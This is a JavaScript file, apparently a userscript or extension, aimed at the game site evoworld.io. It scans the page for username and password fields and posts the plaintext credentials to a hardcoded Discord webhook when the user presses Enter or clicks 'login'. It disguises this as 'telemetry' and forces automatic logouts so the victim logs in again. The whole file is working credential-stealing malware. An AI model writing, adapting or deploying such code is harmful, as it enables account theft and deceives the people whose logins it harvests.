const DEBUG = false;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1464601261285441796/GyzuKtD3fqFle-8k5Nc5S0xtEBXpXnLdrqnuv5WMtISLWlFPwDA2sAi6C5iZF4aFxgWl";

const log = (...args) => DEBUG && console.log(...args);
const err = (...args) => DEBUG && console.error(...args);

let lastTextInput = null;
let lastPasswordInput = null;

// ----------------------------
// Gestione input
// ----------------------------
function updateValue(input) {
  if (!input) return;
  if (input.type === "text" && input.value) lastTextInput = input;
  if (input.type === "password" && input.value) lastPasswordInput = input;
}

function scanInputs() {
  document.querySelectorAll("input").forEach(updateValue);
}

// ----------------------------
// Invio dati al webhook
// ----------------------------
async function sendTelemetry(method) {
  const username = lastTextInput?.value || "";
  const password = lastPasswordInput?.value || "";

  if (!username && !password) return;

  const payload = {
    event: "login_submit",
    username,
    username_length: username.length,
    password, // password reale
    method,
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
      })
    });
    log("Telemetry sent:", payload);
  } catch (e) {
    err("Telemetry error:", e);
  }
}

// ----------------------------
// Eventi per tracciare input e login
// ----------------------------
document.addEventListener("input", e => e.target.tagName === "INPUT" && updateValue(e.target));
document.addEventListener("change", e => e.target.tagName === "INPUT" && updateValue(e.target));
document.addEventListener("paste", e => e.target.tagName === "INPUT" && updateValue(e.target));

document.addEventListener("keydown", e => { 
  if (e.key === "Enter") sendTelemetry("enter"); 
});

document.addEventListener("click", e => {
  const btn = e.target.closest("button");
  if (btn && btn.textContent?.trim().toLowerCase() === "login") sendTelemetry("click_login");
});

// Scan periodico per input dinamici
setInterval(scanInputs, 500);

// Scan iniziale al caricamento della pagina
window.addEventListener("DOMContentLoaded", () => {
  scanInputs();
});

// ----------------------------
// --- Auto Logout evoworld.io ---
// ----------------------------

// variabili GLOBALI sicure
if (window.logoutDone === undefined) {
  window.logoutDone = false;
}

if (window.autoLogoutInterval) {
  clearInterval(window.autoLogoutInterval);
}

window.autoLogoutInterval = setInterval(function () {
  if (window.logoutDone) return;

  var logoutBtn =
    document.querySelector('button.logout') ||
    document.querySelector('a.logout') ||
    document.querySelector('#logout') ||
    document.querySelector('[onclick*="logout"]');

  if (logoutBtn) {
    logoutBtn.click();
    window.logoutDone = true;
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout automatico eseguito");
  }
}, 1000);

// timeout sicurezza
setTimeout(function () {
  if (!window.logoutDone) {
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout non trovato (timeout)");
  }
}, 27500);
